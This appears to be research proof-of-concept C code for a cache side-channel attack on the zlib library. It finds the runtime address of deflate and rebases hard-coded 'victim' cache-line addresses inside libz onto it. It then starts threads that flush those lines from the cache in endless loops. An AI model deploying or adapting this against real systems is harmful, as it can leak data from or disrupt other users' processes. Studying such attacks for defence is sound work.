#include <stdio.h>
/* For "exit". */
#include <stdlib.h>
/* For "strerror". */
#include <string.h>
/* For "errno". */
#include <errno.h>
#include <zlib.h>
#include <pthread.h>
#include "cacheutils.h"

#define CHUNK 0x4000

/* The following macro calls a zlib routine and checks the return
   value. If the return value ("status") is not OK, it prints an error
   message and exits the program. Zlib's error statuses are all less
   than zero. */

#define CALL_ZLIB(x) {                                                  \
	int status;                                                     \
	status = x;                                                     \
	if (status < 0) {                                               \
		fprintf (stderr,                                            \
				"%s:%d: %s returned a bad status of %d.\n",        \
				__FILE__, __LINE__, #x, status);                   \
		exit (EXIT_FAILURE);                                        \
	}                                                               \
}

/* if "test" is true, print an error message and halt execution. */

#define FAIL(test,message) {                             \
	if (test) {                                      \
		inflateEnd (& strm);                         \
		fprintf (stderr, "%s:%d: " message           \
				" file '%s' failed: %s\n",          \
				__FILE__, __LINE__, file_name,      \
				strerror (errno));                  \
		exit (EXIT_FAILURE);                         \
	}                                                \
}

/* These are parameters to inflateInit2. See
http://zlib.net/manual.html for the exact meanings. */

#define windowBits 15
#define ENABLE_ZLIB_GZIP 32

#define SIZEOF(X) (sizeof(X)/sizeof(X[0]))

void *flush_worker( void *ptr )
{
	while(1) {
		flush(ptr);
	}
}

int main ()
{
	const char * file_name = "test.gz";
	FILE * file;
	z_stream strm = {0};
	unsigned char in[CHUNK];
	unsigned char out[CHUNK];

	strm.zalloc = Z_NULL;
	strm.zfree = Z_NULL;
	strm.opaque = Z_NULL;
	strm.next_in = in;
	strm.avail_in = 0;
	CALL_ZLIB (inflateInit2 (& strm, windowBits | ENABLE_ZLIB_GZIP));

	printf("deflate = %p\n", deflate);

	// 0x00007fa6cb23ddc1 /home/mini/workspace/dynamoChannel/zlib/zlib/libz.so.1.2.11!deflate+1345
	// ^ this is cl 0x7fa6cb23ddc0
	// see address_list.txt for the other addresses

	unsigned long victim_cls[] = {
		0x7fa6cb23c7c0,
		0x7fa6cb23c800,
		0x7fa6cb23cdc0,
		0x7fa6cb246d00,
		0x7fa6cb246dc0
	};
	printf("#threads = %d\n", SIZEOF(victim_cls));
	
	for(int i = 0 ; i < SIZEOF(victim_cls) ; i ++) {
		unsigned long victim_addr = victim_cls[i];
		victim_addr += (unsigned long)deflate / 64 * 64;
		victim_addr -= 0x7fa6cb23ddc0 / 64 * 64;

		pthread_t thread1;
		pthread_create( &thread1, NULL, flush_worker, (void*) victim_addr);
	}

	while(1) {
		sleep(100000);
	}

	return 0;
}
